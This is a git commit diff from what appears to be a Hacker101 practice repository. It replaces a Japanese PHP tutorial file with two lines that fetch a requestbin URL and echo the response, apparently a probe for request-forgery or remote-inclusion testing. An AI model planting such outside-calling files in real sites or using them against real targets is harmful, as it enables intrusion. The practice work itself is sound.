6ebe43736721e2271cb8ef2ce745fc7240ea0993
196Ikuchil <22634362+196Ikuchil@users.noreply.github.com>
2019-06-28 00:43:01 +0900

    hacker101

--- hacker101/php/phpinfo.php
+++ hacker101/php/phpinfo.php
@@ -1,37 +1,4 @@
-<!-- php タグの前に書く方法 -->
-<!DOCTYPE html>
-<html lang="ja">
-<head>
 <?php
-
-// echo で出力する方法
-echo '<meta charset="UTF-8">';
-
-// 文字列リテラルとして書く方法（このままでは出力されません）
-$title = 'php で HTML を書く方法';
-
-// 文字列操作でつなげることも出来ます
-echo "<title>{$title}</title>";
-
-// 一時的に php タグから脱出する方法
+    $result = file_get_contents('http://requestbin.fullcontact.com/14aagub1');
+    echo $result;
 ?>
-</head>
-<body>
-<?php
-
-// ヒアドキュメント で HTML を書く方法
-$body = <<<HTML
-Hello
-World!
-<script>
-console.log('不正な処理');
-</script>
-HTML;
-
-// 文字列を関数で加工して表示する方法
-echo nl2br(htmlspecialchars($body));
-
-// php タグの後に書く方法
-?>
-</body>
-</html>
